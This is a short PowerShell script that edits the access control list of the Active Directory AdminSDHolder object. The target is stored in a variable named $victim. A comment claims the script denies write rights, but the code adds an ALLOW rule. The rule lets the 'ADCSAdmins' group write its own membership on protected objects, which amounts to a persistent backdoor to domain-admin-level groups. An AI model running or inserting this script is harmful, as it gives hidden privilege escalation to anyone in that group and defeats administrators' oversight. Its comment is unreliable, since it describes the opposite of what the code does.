Import-Module ActiveDirectory
$ADRoot = (Get-ADDomain).DistinguishedName
Set-Location AD:

#Deny CTRs all WriteProperty rights on the AdminSDHolder
$victim = (Get-ADObject "cn=AdminSDHolder,cn=System,$ADRoot").DistinguishedName
$acl = Get-ACL $victim
$user = New-Object System.Security.Principal.SecurityIdentifier (Get-ADGroup "ADCSAdmins").SID
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $user,"Self","ALLOW",([GUID]("bf9679c0-0de6-11d0-a285-00aa003049e2")).guid,"None",([GUID]("00000000-0000-0000-0000-000000000000")).guid))
#Apply above ACL rules
Set-ACL $victim $acl